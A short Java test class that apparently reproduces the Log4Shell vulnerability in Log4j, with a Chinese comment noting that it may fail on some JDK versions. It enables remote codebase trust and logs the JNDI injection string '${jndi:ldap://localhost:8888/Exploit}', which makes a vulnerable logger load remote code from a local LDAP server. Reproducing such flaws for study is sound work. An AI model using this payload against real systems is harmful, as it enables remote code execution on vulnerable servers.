package log4j.bug;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * LADP测试，可能因为jdk版本不同，测试不出（测试不成功）
 *
 * @author renhuibo
 * @date 2021/12/14 15:34
 */
public class LogTest {

  private static final Logger logger = LogManager.getLogger(LogTest.class);

  public static void main(String[] args) {
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    logger.error("${jndi:ldap://localhost:8888/Exploit}");
    try {
      Thread.sleep(1000);
    } catch (Exception e) {

    }
  }
}
